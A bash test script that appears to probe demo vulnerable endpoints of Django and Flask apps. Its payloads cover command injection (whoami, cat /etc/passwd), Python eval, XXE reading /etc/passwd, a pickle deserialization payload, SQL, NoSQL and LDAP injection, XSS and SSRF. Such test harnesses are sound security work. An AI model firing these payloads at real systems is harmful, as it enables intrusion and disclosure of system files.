#!/bin/bash

HOST=$1
RUN_ID=$2
if [ -z ${HOST} ]; then
  echo -e "api host required!"
  echo -e "Usage: $( basename $0 ) <api host>"
  exit 1
fi

FRAMEWORKS=(django flask)

headline() {
  local TITLE=$1
  echo
  echo "########################## ${TITLE} ##########################"
  echo
}

failed() {
  local MSG=$1
  echo -e "\e[0;31m${MSG}\e[0m"
}

curl_with_code() {
  code=0
  # Run curl in a separate command, capturing output of -w "%{http_code}" into statuscode
  # and sending the content to a file with -o >(cat >/tmp/curl_body)
  status_code=$(curl --no-progress-meter -w "%{http_code}" \
      -o >(cat >/tmp/curl_body) \
      "$@"
  ) || code="$?"
  body="$(cat /tmp/curl_body)"

  if [[ $code -ne 0 ]]; then
    failed "request failed"
  fi
  if [[ $status_code -ne "200" ]]; then
    failed "response error: $status_code"
  fi
  echo $body
  echo
}

api_get() {
  local API_PATH=$1
  local QUERY=$2

  for FRAMEWORK in "${FRAMEWORKS[@]}"; do
    api_get_single ${FRAMEWORK} ${API_PATH} ${QUERY}
  done
}

api_get_single() {
  local FRAMEWORK=$1
  local API_PATH=$2
  local QUERY=$3

  echo "=========================== POST /api/${FRAMEWORK}/${API_PATH}"
  echo
  curl_with_code "${HOST}/api/${FRAMEWORK}/${API_PATH}?_r=${RUN_ID}&${QUERY}"
  echo
}

api_post() {
  local API_PATH=$1
  local DATA=$2

  for FRAMEWORK in "${FRAMEWORKS[@]}"; do
    api_post_single ${FRAMEWORK} ${API_PATH} ${DATA}
  done
}

api_post_single() {
  local FRAMEWORK=$1
  local API_PATH=$2
  local DATA=$3

  echo "=========================== POST /api/${FRAMEWORK}/${API_PATH}"
  echo
  curl_with_code "${HOST}/api/${FRAMEWORK}/${API_PATH}?_r=${RUN_ID}" -X POST --data-raw ${DATA}
  echo
}

headline "exec-command"
api_post "demo/exec_post_popen" "code=ls"
api_post "demo/exec_post_subprocess" "cmd=cat&name=%2Fetc%2Fpasswd"
api_post "demo/cmd_exec" "cmd=whoami"
api_post "demo/exec_post_e" "code=whoami"

headline "exec-code"
api_post "demo/eval_post_e" "code=__import__%28%27os%27%29.system%28%27whoami%27%29"

headline "path-traversal"
api_get "demo/get_open" "name=Data**"
api_post "demo/post_open" "name=.%2Ffile%2Fdata.json"

headline "sql-injection"
api_post_single django "demo/postgresql_post_many" "id=100000&name=song&phone1=13300000000"
api_post_single flask "demo/postgresql_post_many" "id=200000&name=song&phone1=13300000000"
api_post "demo/postgresql_post_excute" "name=song"
api_post "demo/mysql_post_many" "name=song&phone1=13300000000"
api_post "demo/mysql_post_exec" "name=song"
api_post "demo/sqlite3_post_executemany_sql" "phone1=13300000000"
api_post "demo/sqlite3_post_executescript" "name=song&phone1=13300000000"
api_post "demo/sqlite3_post" "name=song"

headline "xss"
api_get "demo/xss_return" "content=alert"
api_get "demo/xss_template" "content=alert"
api_get_single flask "demo/xss_template_string" "content=alert"

headline "xxe"
curl_with_code -H "Content-Type: text/plain" "${HOST}/api/django/demo/xxe_login?_r=${RUN_ID}" -X POST --data-raw '<?xml version="1.0" encoding="utf-8"?><!DOCTYPE Anything [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user><username>&xxe;</username><password>yzx</password></user>'
curl_with_code -H "Content-Type: text/plain" "${HOST}/api/flask/demo/xxe_login?_r=${RUN_ID}" -X POST --data-raw '<?xml version="1.0" encoding="utf-8"?><!DOCTYPE Anything [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user><username>&xxe;</username><password>yzx</password></user>'

headline "ssrf"
api_get "demo/urllib_ssrf" "url=https://www.huoxian.cn/"
api_get "demo/request_ssrf" "url=https://www.huoxian.cn/"

headline "unsafe-deserialization"
api_post "demo/yaml_post_e" "code=whoami"
api_post_single flask "demo/get_pickle_data" "code=gASVIQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAZ3aG9hbWmUhZRSlC4="

headline "nosql-injection"
api_get_single flask "demo/mongo_find" "name=%27%20||%20%27%27%20==%20%27"

headline "ldap-injection"
api_get_single flask "demo/ldap_search" "username=*&password=*"
api_get_single flask "demo/ldap_safe_search" "username=*&password=*"
api_get_single flask "demo/ldap3_search" "username=*&password=*"
api_get_single flask "demo/ldap3_safe_search" "username=*&password=*"
